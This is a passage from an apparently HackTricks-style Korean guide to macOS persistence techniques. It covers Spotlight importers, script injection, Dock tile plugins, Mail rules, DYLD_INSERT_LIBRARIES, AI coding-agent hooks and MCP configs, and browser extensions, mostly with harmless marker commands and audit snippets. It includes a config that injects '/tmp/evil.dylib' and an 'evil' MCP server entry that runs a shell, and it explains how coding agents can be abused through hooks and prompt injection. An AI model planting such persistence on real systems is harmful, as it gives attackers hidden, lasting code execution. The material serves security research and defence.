- `/System/Library/Spotlight/`
  - **트리거**: Spotlight 플러그인이 관리하는 확장자를 가진 새 파일이 생성됩니다.
  - Root 권한 필요
- `Some.app/Contents/Library/Spotlight/`
  - **트리거**: Spotlight 플러그인이 관리하는 확장자를 가진 새 파일이 생성됩니다.
  - 새 앱 필요

#### 설명 및 Exploitation

Spotlight는 macOS에 내장된 검색 기능으로, 사용자에게 **컴퓨터의 데이터에 빠르고 포괄적으로 접근할 수 있도록** 설계되었습니다.\
이러한 빠른 검색 기능을 제공하기 위해 Spotlight는 **독자적인 데이터베이스**를 유지하고, **대부분의 파일을 파싱**하여 색인을 생성하므로 파일 이름과 내용 모두를 빠르게 검색할 수 있습니다.<sup>[[25]](#references)</sup>

Spotlight의 기반 메커니즘에는 'metadata server'를 뜻하는 'mds'라는 중앙 프로세스가 있습니다. 이 프로세스는 전체 Spotlight 서비스를 조율합니다. 이를 보완하기 위해 여러 'mdworker' 데몬이 다양한 파일 형식의 색인 생성 등 여러 유지 관리 작업을 수행합니다(`ps -ef | grep mdworker`). 이러한 작업은 Spotlight importer 플러그인 또는 **".mdimporter bundles**"를 통해 가능하며, Spotlight가 다양한 파일 형식의 콘텐츠를 인식하고 색인을 생성할 수 있도록 합니다.

플러그인 또는 **`.mdimporter`** 번들은 앞서 언급한 위치에 있습니다. 새 번들이 검색되어 파일 형식과 일치해야 하며, Spotlight가 실제로 일치하는 파일을 색인화해야 합니다. 번들을 복사하는 것만으로는 해당 번들이 로드되었다고 입증할 수 없습니다. [Apple의 MDImporter 참조 문서](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter)에 따르면 로드는 조건에 맞는 변경된 파일과 연관됩니다. 여기서는 macOS 26에서 Spotlight importer가 실행되는지 테스트하지 않았습니다.

다음 명령을 실행하면 로드된 모든 `mdimporters`를 **찾을 수 있습니다**:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

그리고 예를 들어 **/Library/Spotlight/iBooksAuthor.mdimporter**는 이러한 유형의 파일(확장자 `.iba`, `.book` 등)을 파싱하는 데 사용됩니다:

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> 다른 `mdimporter`의 Plist를 확인해도 **`UTTypeConformsTo`** 항목을 찾지 못할 수 있습니다. 이는 내장된 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))이므로 확장자를 지정할 필요가 없기 때문입니다.
>
> 또한 시스템 기본 플러그인이 항상 우선 적용되므로, 공격자는 Apple 자체 `mdimporter`가 색인하지 않는 파일에만 접근할 수 있습니다.

직접 importer를 만들려면 다음 프로젝트를 시작점으로 사용할 수 있습니다: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). 그런 다음 이름과 **`CFBundleDocumentTypes`**를 변경하고 **`UTImportedTypeDeclarations`**를 추가해 원하는 확장자를 지원하도록 한 뒤, 이를 **`schema.xml`**에도 반영합니다.\
그런 다음 **`GetMetadataForFile`** 함수의 코드를 **변경**해 처리 대상 확장자를 가진 파일이 생성될 때 payload가 실행되도록 합니다.

마지막으로 새 **`.mdimporter`를 빌드해** 이전에 나온 세 위치 중 한 곳에 복사합니다. **로그를 모니터링**하거나 **`mdimport -L`**을 실행해 로드 여부를 확인할 수 있습니다.

> [!TIP]
> importer sandbox는 매우 제한적이지만, `mdworker`는 **권한 있는 읽기 접근**으로 파일을 색인합니다. 따라서 악성 `.mdimporter`는 TCC로 보호되는 위치(Downloads, Pictures, Desktop, …)의 파일 *내용*을 읽고 수집한 metadata를 TCC 프롬프트 없이 유출할 수 있습니다. 이는 **"Sploitlight" TCC bypass (CVE-2025-31199)**로, macOS Sequoia 15.4에서 패치되었습니다.<sup>[[55]](#references)</sup>

시스템 로그 대신 **Darwin notification 이름**에 보호된 바이트를 담는 별개의 macOS 26 기법은 [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names)를 참조하세요.<sup>[[57]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> 더 이상 작동하지 않는 것 같습니다.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 특정 사용자 동작이 필요합니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

더 이상 작동하지 않는 것 같습니다.<sup>[[26]](#references)</sup>

### Application Script Files

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 하지만 대상 애플리케이션이 설치되어 있어야 하며 피해자가 실행하거나 사용해야 합니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

설치된 애플리케이션이나 도구가 실제로 실행하며 행위자가 수정할 수 있는 **interpreted script**입니다. 파일 권한과 호출 경로를 확인하세요. `.sh` 또는 `.py` 파일을 찾는 것만으로는 충분하지 않습니다. Apple의 [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html)에 따르면 서명된 앱 번들은 스크립트를 포함한 리소스를 봉인합니다. 번들 내부 스크립트를 수정하면 봉인이 깨지며, 번들 검증 시 감지되거나 차단될 수 있습니다. Homebrew의 launcher 같은 외부 스크립트는 서명 및 신뢰 동작이 다릅니다. Writeup에 나온 과거 사례는 다음과 같습니다.

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – 이전 Sublime Text 릴리스에서 사용된 스크립트입니다. 설치된 버전에서 해당 파일과 시작 시 사용 여부를 확인해야 합니다. 테스트 Mac에는 없었습니다.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) 또는 **`/usr/local/bin/brew`** (Intel) – 해당 `brew` 경로가 호출될 때 실행되는 Bash launcher입니다. 설치되어 있고 행위자가 쓰기 권한을 가진 경우에 해당합니다. 테스트 Mac에서는 `/opt/homebrew/bin/brew`가 쓰기 가능한 Bash 스크립트였습니다. 이는 해당 시스템에서 관찰한 내용일 뿐, Homebrew의 일반적인 권한 규칙은 아닙니다.
- **Python 앱 번들 내 IDLE의 `idlemain.py`** – 쓰기에는 admin 권한이 필요할 수 있지만, IDLE 사용자의 identity로 실행됩니다.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – 해당 `org.wireshark.ChmodBPF` launchd job이 설치된 경우 root로 실행되는 과거 셸 스크립트입니다. 테스트 Mac에는 스크립트와 job이 모두 없었습니다.

#### Description & Exploitation

일부 도구와 앱은 실행 중 interpreted script를 실행합니다. 쓰기 가능한 스크립트에 명령을 추가하면, signature validation, quarantine 및 기타 검사를 통과하는 경우 해당 스크립트의 호출자가 다음에 실행될 때 추가 명령이 실행될 수 있습니다. 원래 연구에서는 2019년의 여러 설치 사례를 시연했습니다. 대상 버전에서 해당 경로와 실행 조건을 다시 확인하세요.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

이 복사본 테스트에서 macOS 26.5.2에서 `marker fired: True`가 출력되었으며, 원본 런처는 변경되지 않았습니다. 이는 삽입 지점이 복사본에서 실행된다는 것을 증명하지만, 수정된 서명 앱 번들이나 실제 Homebrew 설치본이 모든 실행 검사를 통과한다는 것을 증명하지는 않습니다.

### Dock Tile 플러그인

작성 자료: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 플러그인을 선언한 앱이 Dock에서 검색/등록되고 처리되어야 합니다.
  - 플러그인은 app-sandbox entitlement가 없고 **library validation이 비활성화된** **Apple 서명** 헬퍼에 로드됩니다. 인용된 연구에서는 이 헬퍼가 Background Task Management UI에 표시되지 않았습니다. 대상 릴리스에서 표시되는지는 확인해야 합니다.
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**. 앱의 `Info.plist`에서 **`NSDockTilePlugIn`** 키로 참조되며, 플러그인 자체의 `Info.plist`에는 **`NSPrincipalClass`**가 설정됩니다.

#### 설명 및 악용

앱이 `NSDockTilePlugIn`을 선언하면 Dock은 로그인 시점이나 해당 앱의 타일이 추가될 때 참조된 번들을 **`com.apple.dock.external.extra`** XPC 헬퍼(Apple Silicon에서는 `...extra.arm64`)에 로드할 수 있습니다. 앱 자체를 실행할 필요는 없습니다. 이를 위해서는 앱이 macOS에서 검색/등록되고 허용되어야 합니다. 이 헬퍼는 **Apple 서명**을 받았으며, `com.apple.security.app-sandbox` entitlement가 없고 `com.apple.security.cs.disable-library-validation`이 설정되어 있습니다. 로드 시 주 클래스의 **`setDockTile:`** 메서드가 호출되며, 이를 통해 나중에 발생하는 이벤트를 위해 분산 알림(예: `com.apple.screenIsLocked`)을 구독할 수 있습니다.<sup>[[38]](#references)</sup>

macOS 26.5.2에서 읽기 전용 `codesign` 검사를 통해 헬퍼의 Apple 서명과 entitlements를 확인했으며, 설치된 여러 앱이 `NSDockTilePlugIn`을 선언한 것도 확인했습니다. 해당 Mac에는 새 플러그인을 설치하거나 로드하지 않았으므로, 이 릴리스에서 새로 작성한 번들의 실행 여부는 아직 테스트되지 않았습니다.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

분석 글: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 위젯 extension은 **자체 프로세스**에서 실행되며, 이를 추가해도 Background Task Management 경고가 표시되지 않습니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - config plist는 TCC로 보호되는 컨테이너 안에 있으므로, 외부에서 편집하려면 Full Disk Access 또는 TCC bypass가 필요합니다

#### 위치

- 위젯 extension 번들: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- 활성화/등록된 위젯: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (키 `widgets.instances` 및 `widgets.widgets`)

#### 설명 및 악용

앱에 포함되어 배포된 WidgetKit extension은 Notification Center가 관리하는 **자체 프로세스**에서 실행됩니다. `widgets.instances`에 인스턴스를 등록하고(`INIntent` 데이터가 포함된 base64 인코딩 `NSKeyedArchiver` 형식의 `CHSWidget` blob), NotificationCenter를 재시작하면 위젯이 로드되어 `TimelineProvider`/intent 코드가 실행됩니다.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app 규칙 (AppleScript 실행)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 단, Mail.app에 계정이 설정되어 있고 실행 중이어야 하며, 트리거는 수신 이메일입니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Mail 외부에서 규칙/스크립트를 수정하려면 Mail을 종료해야 할 수 있으며, 최신 macOS에서는 Full Disk Access가 필요합니다.

#### 위치

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (로컬 규칙; Sonoma/Sequoia에서는 `V10`, 이후 버전에서는 `V11`+)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud 동기화 규칙, 우선 적용)
- 규칙 활성화 상태: **`RulesActiveState.plist`**; AppleScript 페이로드: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### 설명 및 악용

Apple Mail **규칙**에는 *"Run AppleScript"* 동작을 설정할 수 있습니다. 조작된 **제목 줄**과 일치하고 공격자 스크립트를 실행하는 규칙을 추가하면, 공격자는 마법의 이메일이 도착할 때마다 Mail의 컨텍스트에서 **원격으로 트리거할 수 있는 은밀한** 코드 실행을 얻습니다. LaunchAgent/Login Item이 생성되지 않으므로 여러 persistence 스캐너를 우회하는 벡터입니다.<sup>[[42]](#references)</sup> 트리거 이메일을 **삭제**하도록 규칙을 설정하면 증거도 숨길 수 있습니다. 방어자는 다음 위치에서 직접 검색할 수 있습니다:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### 구성 프로파일 (.mobileconfig)

분석 글: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- sandbox 우회에 유용: [🔴](https://emojipedia.org/large-red-circle)
  - 최신 macOS에서는 시스템 설정 → *기기 관리*에서 **수동으로 사용자 승인**을 해야 합니다 (MDM 외부에서는 무인 `profiles install`이 더 이상 불가능합니다)
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- 설치된 프로파일은 **`/Library/Managed Preferences/`** 및 **`/var/db/ConfigurationProfiles/`**에 있습니다. 프로파일은 `PayloadContent` 배열이 포함된 XML plist입니다.

#### 설명 및 악용

`.mobileconfig`는 직접적인 코드 실행 수단은 아니지만 **신뢰할 수 있는 루트 CA**(`com.apple.security.root`), **전역 또는 PAC 프록시**(`com.apple.proxy.*`), **관리되는 환경설정**(`com.apple.ManagedClient.preferences`) 또는 제한 사항과 같은 설정을 지속적으로 적용할 수 있습니다. macOS 10.15 이상에서 Apple의 [`PayloadRemovalDisallowed` 정의](https://developer.apple.com/documentation/devicemanagement/toplevel)에 따르면, **수동으로 설치한** 프로파일에서 제거 암호 payload 없이 이 값을 `true`로 설정하면 제거 시 **관리자 인증**이 필요합니다. 그렇다고 해당 프로파일을 절대 제거할 수 없게 되는 것은 아닙니다. MDM으로 설치된 프로파일에는 별도의 관리 및 제거 규칙이 적용됩니다.<sup>[[44]](#references)</sup>

> [!WARNING]
> 일반 구성 프로파일에는 임의의 `LaunchDaemon`/`LaunchAgent`를 설치하는 **payload 유형이 없습니다**. 그런 방식으로 daemon을 설치하려면 전체 **MDM 등록**과 관리 에이전트/스크립트가 필요합니다. `.mobileconfig`를 launchd 전달 수단으로 간주하지 마세요.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- sandbox 우회에 유용: [🔴](https://emojipedia.org/large-red-circle)
  - dyld는 SIP/platform 바이너리, hardened-runtime 앱 및 setuid 대상에서 `DYLD_*`를 **제거**하므로, 보호되지 않은 프로세스에만 삽입하며 SIP/hardened runtime을 우회하지는 **않음**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 신뢰할 수 있는 방식: 악성 `LaunchAgent`/`LaunchDaemon` plist 내부의 **`EnvironmentVariables`** dict (로그인/부팅 시 실행)
- 더 이상 사용되지 않는 과거 방식(참고용): **`~/.MacOSX/environment.plist`** (10.8에서 제거됨) 및 **`/etc/launchd.conf`** (10.10에서 제거됨)

#### Description & Exploitation

공격자가 피해자 프로세스의 환경에 `DYLD_INSERT_LIBRARIES`를 넣을 수 있다면, dyld가 공격자의 dylib를 해당 프로세스에 로드합니다(해당 dylib의 constructor가 실행됨). 지속성 방식은 이 변수를 LaunchAgent에 넣어 작업이 실행될 때마다 다시 삽입하도록 합니다. 최신 macOS에서는 `launchctl setenv DYLD_*`가 필터링되므로, 대신 plist에 넣어야 합니다.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

dylib injection/hijacking의 전체 동작 방식은 다음을 참조하세요.

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLI(훅, MCP 서버, 규칙 파일)

관련 글: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [규칙 파일 백도어 (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 개발자가 해당 agent를 사용해야 합니다. agent가 설정을 수락하면 시작 명령은 해당 사용자의 권한으로 실행됩니다. workspace 신뢰 및 MCP 승인 절차는 제품과 세션 모드에 따라 다릅니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (사용자 권한으로 실행되며, 터미널/agent가 이미 가진 권한을 상속합니다)

#### 위치

명시적 훅 및 MCP 설정 파일은 **개발자가 도구를 사용할 때 셸 명령이나 자식 프로세스를 실행**할 수 있습니다. 사용자별 전역 파일(지속성)에서 실행되거나 저장소에 커밋된 파일(공급망)을 통해 실행될 수 있습니다. `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, 편집기 규칙은 **agent에 전달되는 지침**이지, 읽는 순간 셸 명령 실행이 보장되는 것은 아닙니다. 그 효과는 agent의 동작과 도구 권한에 따라 달라집니다. 각 제품의 최신 신뢰 및 승인 규칙을 확인하세요.

- **Claude Code**
  - `~/.claude/settings.json`, 프로젝트의 `.claude/settings.json`, `.claude/settings.local.json`, 그리고 root 전용 **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/관리 설정은 사용자가 **덮어쓸 수 없음** → 강력한 지속성)
  - `hooks` 객체 — `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` 이벤트 — 각 이벤트에서 셸 `command` 실행
  - `statusLine.command` — 상태 표시줄을 렌더링하기 위해 실행되는 셸 명령(모든 세션에서 실행)
  - `~/.claude.json` / 프로젝트의 `.mcp.json`에 정의된 MCP 서버 — 자식 프로세스로 `command`+`args` 실행
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — prompt injection을 시도할 수 있는 지침이며, agent의 동작과 도구 권한에 따라 달라짐
- **OpenAI Codex CLI**: `~/.codex/config.toml`의 `[mcp_servers.*]` (`command`/`args`가 자식 프로세스로 실행됨); 프로젝트 지침인 `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP 서버); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … 명령 실행); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot의 `.github/copilot-instructions.md`

#### 설명 및 악용

행위자가 계정의 사용자 전역 설정을 수정할 수 있다면, 해당 계정에서 이후 세션이 시작될 때 훅이나 MCP 명령을 실행할 수 있습니다. 저장소에서 제어하는 설정은 별개의 경우입니다. [최신 Claude Code 보안 문서](https://code.claude.com/docs/en/security)는 대화형 workspace 신뢰 확인 대화상자와 프로젝트의 `.mcp.json` 서버에 대한 별도 승인 메시지를 설명합니다. [권한 매트릭스](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder)에 따르면 상위 폴더를 신뢰한 뒤 훅이 실행될 수 있으며, `claude -p`/SDK 세션에서는 대화형 신뢰 확인 메시지가 표시되지 않습니다. 이러한 비대화형 모드에서는 프로젝트 MCP 서버가 승인 메시지 없이 연결됩니다. CVE-2025-59536으로 보고된 신뢰 전 프로젝트 훅 우회는 [2025년에 수정되었습니다](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/). 이를 현재 기본 동작으로 간주하지 마세요. 유포 경로에는 침해된 저장소나 악성 설치 프로그램이 포함될 수 있습니다. 규칙 파일을 통한 prompt injection은 명시적 훅보다 결과가 덜 예측 가능하며, 도구 승인 여부에도 영향을 받습니다.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

사용자 전역 Claude Code 설정 예시입니다. 테스트할 때만 폐기 가능한 계정에 배치하세요:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

사용자 전역 Codex MCP 구성 예시:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

예시 Cursor hook 구성입니다. 사용하기 전에 설치된 버전의 schema를 확인하세요:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions (Chromium: Chrome / Brave / Edge)

설명: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [macOS에서의 ExtensionInstallForcelist 악용](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 지원되는 브라우저와 설치 및 활성화된 확장 프로그램이 필요합니다. macOS의 External Extensions는 사용자의 확인이 필요하며, 관리형 force-install에는 해당되는 엔터프라이즈 정책이 필요합니다.
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> 이는 **native messaging hosts**와는 다릅니다(위의 *Chrome native messaging hosts* 섹션 참조). 여기서 지속성은 **자동 설치된 확장 프로그램** 자체입니다.

#### 위치

- **External Extensions JSON** (브라우저 시작 시 검색되며, 이후 macOS에서 활성화 확인 메시지가 표시됨):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (사용자별) 또는 `/Library/Application Support/Google/Chrome/External Extensions/` (모든 사용자)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- 관리형 환경설정 / 구성 프로파일을 통한 **엔터프라이즈 정책 force-install**:
  - `com.google.Chrome` 키 `ExtensionInstallForcelist` (Brave는 `com.brave.Browser`, Edge는 `com.microsoft.Edge`), `/Library/Managed Preferences/` 또는 설치된 `.mobileconfig`에서 읽음

#### 설명 및 악용

이 둘은 서로 다른 설치 경로입니다. Chrome의 [external-install 문서](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)에 따르면 *External Extensions* 파일을 통해 제공된 확장 프로그램은 **Windows 및 macOS 사용자가 확인하고 활성화해야** 하며, 해당 JSON 파일을 기록하는 것만으로 실행되지는 않습니다. macOS에서 모든 사용자에게 설치하려면 Chrome은 외부 확장 프로그램 파일이 권한이 낮은 사용자에 의해 수정되지 않도록 보호할 것도 요구합니다. 관리형 `ExtensionInstallForcelist` 또는 `ExtensionSettings` 정책은 사용자 상호작용 없이 확장 프로그램을 설치하고 고정할 수 있습니다. [Google의 Mac 정책 가이드](https://support.google.com/chrome/a/answer/7517624)는 관리형 구성을 설명하며, 강제 설치된 확장 프로그램은 사용자가 제거할 수 없다고 명시합니다. 이는 정책 배포 경로이지, 사용자별 `defaults write` 단축 방법이 아닙니다.<sup>[[49]](#references)</sup>

> [!WARNING]
> macOS에서 *External Extensions* JSON manifest는 로컬 CRX가 아닌 **Chrome Web Store** 업데이트 URL을 지정해야 합니다. 관리형 정책 배포에는 별도의 엔터프라이즈 전제 조건이 있으며, 관리형 자체 호스팅 업데이트 URL을 허용할 수 있습니다. 테스트 프로필에서 로컬 unpacked extension을 사용하려면 Chrome의 개발자 모드 `--load-extension=/path` 스위치를 사용할 수 있습니다. 이는 별도의 방식이며 External Extensions JSON 파일을 자동 실행되게 만들지는 않습니다. `Secure Preferences`에 쓰는 것을 문서화된 등록 경로 중 하나와 동일하게 취급하지 마세요.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Chrome을 해당 일회용 계정에서 실행하고 활성화 프롬프트를 확인하세요. 사용자가 수락하면 확장 프로그램 자체 동작이 실행 PoC가 됩니다. 테스트 후에는 manifest를 제거하고 해당 프로필에서 확장 프로그램을 비활성화하거나 제거하세요. 이 경로는 연구용 Mac의 활성 Chrome 프로필에서는 테스트하지 않았습니다. 관리 정책 경로도 해당 환경에 배포하지 않았습니다.

Force-install 및 External Extensions는 **Chrome Web Store** 확장 프로그램 ID를 참조합니다. 프로필의 HMAC 서명된 `Secure Preferences`를 편집해 로컬 확장 프로그램을 조용히 주입하는 하위 수준 기법과 Chromium 프로세스 악용에 대해서는 다음을 참조하세요.

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme 및 파일 형식 핸들러 (LaunchServices)

작성 글: [사용자 지정 URL Scheme을 통한 원격 Mac 악용 (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 트리거는 피해자가 링크(예: Chrome/Brave/Safari에서)를 클릭하거나 등록된 형식의 파일을 여는 것입니다
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- 앱 번들의 `Info.plist`에 **`CFBundleURLTypes`/`CFBundleURLSchemes`**(사용자 지정 URL scheme) 또는 **`CFBundleDocumentTypes`**(파일 확장자/UTI)가 선언되어 있음
- 사용자별 유효 기본값은 **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`**의 `LSHandlers` 배열에 나타날 수 있습니다. URL scheme의 기본 핸들러를 선택하기 위해 Apple이 지원하는 API는 `LSSetDefaultHandlerForURLScheme`입니다. 해당 plist를 직접 쓰는 것은 문서화된 등록 또는 캐시 업데이트 방법이 아닙니다.

#### 설명 및 악용

